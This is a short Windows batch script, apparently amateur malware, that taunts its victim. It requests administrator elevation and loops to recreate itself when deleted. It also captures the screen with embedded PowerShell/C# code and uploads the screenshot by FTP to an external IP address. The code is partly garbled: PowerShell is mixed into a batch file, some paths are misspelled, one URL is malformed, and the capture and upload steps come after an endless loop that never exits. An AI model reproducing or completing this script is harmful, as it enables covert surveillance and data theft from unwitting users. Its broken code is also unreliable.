@echo off
:: Check if the script is running as administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c', 'main.bat' -Verb RunAs"
    exit
)
:: Proceed with the rest of the script if running as administrator

echo helo, your dumbass brain installed a virus
echo and you cant dekete this BYE BYE LOOSER
:Start
if not exist "main.bat" (
    echo File deleted! Recreating...
    copy "C:\path_to_original/main.bat" "main.bat"
)
timeout /t 5
goto Start
echo easy ip
start chrome https://www/whatismyipaddress.com

Add-Type -TypeDefinition @"
using System;
using System.Drawing;
using System.Windows.Forms;

public class Screenshot {
    public static void Capture(string filePath) {
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height)) {
            using (Graphics g = Graphics.FromImage(bitmap)) {
                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
            }
            bitmap.Save(filePath, System.Drawing.Imaging.ImageFormat.Png);
        }
    }
}
"@
# Call the Capture method to take a screenshot and save it in the Saved Pictures folder
[Screenshot]::Capture("Adim\Pictures\Saved Pictures\screenshot.png")

:: FTP script to send screenshot to your laptop
echo open 45.81.188.160 > ftp_commands.txt
echo USERNAME >> ftp_commands.txt
echo PASSWORD >> ftp_commands.txt
echo binary >> ftp_commands.txt
echo put "Admin\Pictures\Saved Pictures\screenshot.png" /path/to/remote/directory/screenshot.png >> ftp_commands.txt
echo bye >> ftp_commands.txt

ftp -n -s:ftp_commands.txt
del ftp_commands.txt
